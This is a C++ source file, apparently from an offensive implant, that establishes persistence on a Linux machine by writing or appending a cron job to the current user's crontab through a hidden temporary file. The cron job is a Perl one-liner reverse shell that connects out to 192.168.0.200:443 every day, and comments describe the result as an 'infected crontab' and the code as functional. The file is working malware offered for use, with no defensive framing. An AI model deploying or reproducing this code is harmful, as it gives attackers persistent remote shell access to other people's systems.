// crontab -r                                   --> this resets the crontab of the caller
// crontab cron_formatted_file.sh               --> this will install the file as the crontab of the caller
// crontab -l                                   --> this lists the caller's crontab and can be used to check if it currently exists

// this code is functional
// this code should be refactored so that the main conditional in establish_crontab_persistence is not repetitive

#include <iostream>
#include "run_command.h"
#include <cstdlib>
#include <string>
#include <fstream>
#include <sstream>

std::string get_current_user();
int write_infected_crontab(std::string ingoing_crontab_file_contents);

bool establish_crontab_persistence() {

    /*
     * check if the user has an existing crontab        ("no crontab" in the output of crontab -l)
     * create local hidden file
     * install it as a crontab
     * */

    std::cout << "[+] Entering the Crontab persistence routine" << '\n';

    int counter { 0 };                                              // the local flag to check if persistence was established

    std::string current_user = get_current_user();
    if (current_user == "FAILED_NO_USER") {return false;}               // no opportunity to edit a crontab if we don't have a user for some reason

    std::string existing_crontab = run_command("crontab -l", "&1");

    // this is the string being checked for in the output of "crontab -l 2>&1"  -> if it is present, we write a new crontab
    std::string no_crontab_string = "no crontab for";

    if (existing_crontab.find(no_crontab_string) != std::string::npos) {        // if no existing crontab, create one
        try {
            std::cout << "[+] No crontab for " << current_user << '\n';
    
            // the injected cron job is based on perl because the perl executable is required by the linux kernel; thus, its presence is very reliable.
            // python3 -c 'import pty; pty.spawn("/bin/bash");'             --> use this once the shell is spawned for a clean, stable command line
            std::string new_crontab_contents = "45 4 * * * `which perl` -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"192.168.0.200:443\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\n";
    
            int result = write_infected_crontab(new_crontab_contents);
            if (result) {
                std::cout << "[+] Successfully created new infected crontab for " << current_user << '\n';
                counter ++;
            }
        } catch (...) {
            return false;
        } 
    }
    else {                                                                    // crontab exists, it needs to be modified
        try {
            std::cout << "[+] Crontab exists for " << current_user << '\n';
            std::cout << "[+] The contents of the existing crontab: " << existing_crontab << '\n';
    
            std::stringstream modified_crontab;
    
            modified_crontab << existing_crontab << "\n\n" << "45 4 * * * `which perl` -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"192.168.0.200:443\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\n";
    
            int result = write_infected_crontab(modified_crontab.str());
            if (result) {
                counter++;
                std::cout << "[+] Successfully infected existing crontab for " << current_user << '\n';
            } 
        } catch (...) {
            return false;
        }
    }

    // if the counter has been incremented, that means that persistence was successfully established
    if (counter > 0) {return true;} else {return false;}        // make sure this line is correct before use --> should be > 0 if cron persistence was achieved
}

std::string get_current_user() {
    const char * current_user = std::getenv("USER");
    if (current_user) {return std::string(current_user);} else {return "FAILED_NO_USER";}
}

int write_infected_crontab(std::string ingoing_crontab_file_contents) {
    // parameter 1 is the string that should be written to the crontab
    // no crontab exists    -> write the malicious job
    // existing crontab     -> append the malicious job to the existing contents and write the whole string (replacing the current crontab)

    try {
        std::ofstream hidden_cronjob_file(".qwertyuiop.job");
        hidden_cronjob_file << ingoing_crontab_file_contents;
        hidden_cronjob_file.close();
    
        std::stringstream crontab_write_command;
        crontab_write_command << "crontab .qwertyuiop.job";
        
        std::string result = run_command(crontab_write_command.str().c_str(), "&1");
        run_command("rm .qwertyuiop.job", "&1");
        return true;
    } catch (...) {
        std::cout << "[!] Exception raised while establishing cron based persistence..." << '\n';
        return false;
    }

}

